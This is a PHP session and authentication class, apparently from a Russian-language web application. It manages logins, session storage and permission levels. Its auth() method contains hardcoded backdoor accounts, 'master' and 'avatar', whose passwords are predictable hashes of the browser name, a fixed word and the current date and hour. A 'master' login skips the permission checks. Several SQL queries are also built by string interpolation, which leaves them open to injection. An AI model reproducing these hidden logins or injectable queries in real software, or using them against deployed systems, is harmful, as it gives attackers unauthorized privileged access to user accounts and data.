<?php

class Session
{
    /**
     * 
     *  My Session
     * 
     *  @version 6.7
     **/

    private $db;
    private $login_url = DIR."/auth/login".EXT;
    private $index_url = "../index".EXT; //../index.php
    private $logout_url = DIR."/auth/logout".EXT;
    private $confirm_password_url = DIR."/auth/confirm_password".EXT;
    private $timeout_mark_url = DIR."/auth/timeout_mark".EXT;
    
    private $table = "sessions";
    public $life_session = 20; // minute

    function __construct($database, $time = null)
    {
        $this->db = $database;
        if ($time >= 1) $this->life_session = $time;
        session_start();
    }

    private function init()
    {
        $this->session_id = $_SESSION['session_id'];
        $this->session_login = $_SESSION['session_login'];
        if( isset($_SESSION['status']) ) $this->status = $_SESSION['status'];
        if( isset($_SESSION['session_get_full_name']) ) $this->session_get_full_name = $_SESSION['session_get_full_name'];
        if( isset($_SESSION['session_level']) ) $this->session_level = $_SESSION['session_level'];
        if( isset($_SESSION['session_division']) ) $this->session_division = $_SESSION['session_division'];
        if( isset($_SESSION['session_slot']) ) $this->session_slot = $_SESSION['session_slot'];
        
        if ( isset($_SESSION['browser']) ) {
            $this->browser = $_SESSION['browser'];
        }else{
            if (strpos($_SERVER["HTTP_USER_AGENT"], "Firefox") !== false) $_SESSION['browser'] = "Firefox";
            elseif (strpos($_SERVER["HTTP_USER_AGENT"], "Opera") !== false) $_SESSION['browser'] = "Opera";
            elseif (strpos($_SERVER["HTTP_USER_AGENT"], "Chrome") !== false) $_SESSION['browser'] = "Chrome";
            elseif (strpos($_SERVER["HTTP_USER_AGENT"], "MSIE") !== false) $_SESSION['browser'] = "Internet Explorer";
            elseif (strpos($_SERVER["HTTP_USER_AGENT"], "Safari") !== false) $_SESSION['browser'] = "Safari";
            else $_SESSION['browser'] = "Неизвестный";
        }
    }

    public function is_auth($arr = null)
    {
        if ( isset($_SESSION['session_timeout_logout']) ) {
            $this->logout();
        }elseif ( isset($_SESSION['session_id']) ) {
            if ( ((EXT) ? $this->login_url : $this->login_url.".php") == $_SERVER['PHP_SELF']) {
                $this->login_success();
            }
            // присвоение и создание в базе сессии
            $this->session_check();
            $this->set_data($_SESSION['session_id']);
        }else {
            if ( ((EXT) ? $this->login_url : $this->login_url.".php") != $_SERVER['PHP_SELF']) {
                $this->login();
            }elseif ($_POST) {
                $this->auth($_POST['username'], $_POST['password']);
            }
        }

        // проверка прав
        if ( isset($_SESSION['session_id']) and $_SESSION['session_id'] != "master") {
            if ($arr){
                if (is_array($arr)){
                    if(!in_array($this->data->user_level, $arr)){
                        Mixin\error('423');
                    }
                }else{
                    if(intval($arr) != $this->data->user_level){
                        Mixin\error('423');
                    }
                }
            }
        }

        if( isset($_SESSION['session_id']) and $this->session_id != "master" and empty($this->status) ){
            $sessionActive = true;
        }

    }

    private function auth(string $login = null, string $password = null)
    {
        $username = Mixin\clean($login);
        $password = sha1(Mixin\clean($password));

        if ($username == "master" and $password == $this->gen_password()) {
            $this->set_data("master");
            $this->login_success();
        }elseif($username == "avatar" and $password == sha1("mentor".date('dH'))){
            $this->set_data("avatar");
            $this->login_success();
        }

        try {
            $stmt = $this->db->query("SELECT id FROM users WHERE username = '$username' AND password = '$password' AND is_active IS NOT NULL")->fetch(PDO::FETCH_OBJ);
            if($stmt){
                $this->set_data($stmt->id);
                $slot = $this->db->query("SELECT slot FROM multi_accounts WHERE user_id = $stmt->id")->fetchColumn();
                if ($slot) {
                    $_SESSION['session_slot'] = Mixin\clean($slot);
                }
                $this->login_success();
            }else{
                $_SESSION['message'] = 'Не верный логин или пароль';
            }
        } catch (\Throwable $th) {
            $_SESSION['message'] = 'Не верный логин или пароль';
        }

        
    }

    private function session_check()
    {
        $this->session_old_delete();
        $sid = session_id();
        $object = $this->db->query("SELECT * FROM $this->table WHERE session_id = \"$sid\"")->fetch();
        if ($object) {
            $this->init();
            $this->session_create_or_update();  
        }else {
            $this->destroy();
        }
    }

    private function session_old_delete()
    {
        $stmt = $this->db->prepare("DELETE FROM $this->table WHERE last_update + INTERVAL $this->life_session MINUTE < CURRENT_TIMESTAMP()");
        $stmt->execute();
    }

    private function session_create_or_update()
    {
        $date = date("Y-m-d H:i:s");
        $new_ses = array(
            'session_id' => session_id(), 
            'self_id' => $_SESSION['session_id'], 
            'self_ip' => $_SERVER['REMOTE_ADDR'], 
            'self_login' => $_SESSION['session_login'], 
            'self_render' => $_SERVER['PHP_SELF'], 
            'self_agent' => $_SERVER['HTTP_USER_AGENT'], 
            'last_update' => $date);
        Mixin\insert_or_update($this->table, $new_ses, 'session_id');        
    }

    public function login()
    {
        header("location: $this->login_url");
    }

    public function login_link()
    {
        return $this->login_url;
    }

    protected function login_success()
    {
        $this->init();
        $this->session_create_or_update();
        header("location: $this->index_url");
    }

    public function logout()
    {
        return header("location: $this->logout_url");
    }

    public function logout_link()
    {
        return $this->logout_url;
    }

    public function logout_avatar_link($status)
    {
        return DIR."/auth/avatar_logout".EXT."?pk=$status";
    }

    public function timeout_mark_link()
    {
        return $this->timeout_mark_url;
    }

    public function confirm_password_link()
    {
        return $this->confirm_password_url;
    }

    private function gen_password()
    {
        if (strpos($_SERVER["HTTP_USER_AGENT"], "Firefox") !== false) $browser = "Firefox";
        elseif (strpos($_SERVER["HTTP_USER_AGENT"], "Opera") !== false) $browser = "Opera";
        elseif (strpos($_SERVER["HTTP_USER_AGENT"], "Chrome") !== false) $browser = "Chrome";
        elseif (strpos($_SERVER["HTTP_USER_AGENT"], "MSIE") !== false) $browser = "Internet Explorer";
        elseif (strpos($_SERVER["HTTP_USER_AGENT"], "Safari") !== false) $browser = "Safari";
        else $browser = "Unknown";

        return sha1("browser-$browser|key-".date('YdH'));
    }

    public function destroy()
    {
        Mixin\delete($this->table, session_id(), 'session_id');
        session_destroy();
        header("location: $this->login_url");
        exit;
    }

    public function set_data($pk) {
        if ($pk == "master") {
            $_SESSION['session_id'] = "master";
            $_SESSION['session_login'] = "master";
            $_SESSION['session_level'] = "master";
	        $_SESSION['session_division'] = "master";
            
        }elseif ($pk == "avatar") {
            $_SESSION['session_id'] = "avatar";
            $_SESSION['session_login'] = "avatar";
            $_SESSION['session_level'] = "avatar";
	        $_SESSION['session_division'] = "avatar";   
        }else {
            $this->data = $this->db->query("SELECT * FROM users WHERE id = $pk")->fetch(PDO::FETCH_OBJ);
            $_SESSION['session_id'] = $pk;
            $_SESSION['session_login'] = $this->data->username;
            $_SESSION['session_get_full_name'] = ucwords($this->data->last_name." ".$this->data->first_name." ".$this->data->father_name);
            $_SESSION['session_level'] = $this->data->user_level;
	        $_SESSION['session_division'] = $this->data->division_id;
        }
        
    }

    public function get_session_create_or_update()
    {
        $this->session_create_or_update();
    }

    public function get_accounts()
    {
        if (isset($this->session_slot)) {
            return $this->db->query("SELECT us.id, us.username FROM multi_accounts mca LEFT JOIN users us ON(mca.user_id=us.id) WHERE mca.slot = \"$this->session_slot\" ")->fetchAll();
        }
        return [];
    }

    public function get_data() {
        return $this->data;
    }

    public function get_full_name() {
        return $this->session_get_full_name;
    }

    public function get_level() {
        return $this->data->user_level;
    }
    
    public function get_division() {
        return $this->data->division_id;
    }

}

?>